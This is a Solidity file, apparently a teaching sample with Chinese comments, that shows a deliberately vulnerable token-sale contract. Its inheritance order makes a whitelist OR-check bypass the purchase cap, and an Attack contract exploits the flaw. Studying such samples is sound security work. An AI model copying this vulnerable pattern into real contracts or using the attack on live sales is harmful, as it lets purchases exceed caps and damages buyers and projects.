// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
 漏洞描述：Wrong class inheritance order

 在此漏洞範例中，我們有三個合約：SalesCompl、Utils 與 WhitelistedBuyers，每個合約都定義了 validPurchase 函式。
 攻擊者可以利用錯誤的繼承順序，藉由白名單檢查邏輯 (OR) 繞過 cap 限制，達成超量購買的目的。

 本漏洞版本中，Sales 合約使用的繼承順序為：Utils, WhitelistedBuyers。
 但由於兩個基礎合約都覆寫了 validPurchase，編譯器要求在 Sales 合約中必須明確覆寫該函式，
 因此我們在 Sales 合約中新增了一個 override 函式，其內部呼叫 super.validPurchase() 以利用線性化順序。

 攻擊流程：
 1. 部署 SalesCompl、Utils、WhitelistedBuyers 與 Sales (採用繼承順序 Utils, WhitelistedBuyers) 合約。
 2. 攻擊者如果被列入白名單，則可搭配合理的區塊時段，使得 validPurchase() 返回 true ，
    即便 (weiRaised + msg.value) 超過 cap，也能繼續購買，達成購買超額的目的。
 3. Attack 合約呼叫 Sales.buy() 進行攻擊測試。
*/

contract SalesCompl {
    uint256 public startBlock;
    uint256 public endBlock;

    constructor() {
        startBlock = block.number;
        endBlock = block.number + 100; // 銷售期間為 100 個區塊
    }

    // 基礎購買檢查邏輯
    function validPurchase() internal view virtual returns (bool) {
        uint256 current = block.number;
        bool withinPeriod = (current >= startBlock && current <= endBlock);
        bool nonZeroPurchase = (msg.value != 0);
        return withinPeriod && nonZeroPurchase;
    }
}

contract Utils is SalesCompl {
    uint256 public cap;
    uint256 public weiRaised;

    constructor() {
        cap = 100 ether; // 設定購買上限
        weiRaised = 0;
    }

    // 在此合約中，檢查是否落在 cap 限制內
    function validPurchase() internal view virtual override returns (bool) {
        bool withinCap = (weiRaised + msg.value) <= cap;
        return super.validPurchase() && withinCap;
    }
}

contract WhitelistedBuyers is SalesCompl {
    mapping(address => bool) public whitelist;

    constructor() {
        // 將合約部署者預設加入白名單
        whitelist[msg.sender] = true;
    }

    // 白名單邏輯：若呼叫者在 whitelist 中且銷售尚未結束，則允許購買
    function validPurchase() internal view virtual override returns (bool) {
        return super.validPurchase() || (whitelist[msg.sender] && !hasEnded());
    }

    function hasEnded() internal view returns (bool) {
        return block.number > endBlock;
    }
}

// 漏洞合約：使用錯誤的繼承順序 (Utils, WhitelistedBuyers) 可能導致檢查邏輯順序有問題
contract Sales is Utils, WhitelistedBuyers {
    // 必須明確覆寫 validPurchase，解決多重繼承衝突
    function validPurchase() internal view override(Utils, WhitelistedBuyers) returns (bool) {
        // 此處根據線性化順序，會依序呼叫 WhitelistedBuyers.validPurchase -> Utils.validPurchase -> SalesCompl.validPurchase
        // 攻擊者若在 whitelist 中，則可利用 OR 邏輯繞過 cap 檢查
        return super.validPurchase();
    }

    // 對外買入函式
    function buy() public payable {
        require(validPurchase(), "Purchase not valid");
        weiRaised += msg.value;  // 更新累計募集金額
    }

    // 輔助函式，讓外部可以查詢 validPurchase 結果
    function checkValid() public view returns (bool) {
        return validPurchase();
    }
}

// 攻擊合約：模擬攻擊者利用漏洞進行攻擊
contract Attack {
    Sales public vulnerableSales;

    constructor(address _sales) {
        vulnerableSales = Sales(_sales);
    }

    // 攻擊者呼叫此函式，並傳入大量 Ether，若符合條件則可繞過 cap 限制
    function attack() public payable {
        vulnerableSales.buy{value: msg.value}();
    }

    // 接收 Ether
    receive() external payable {}
}
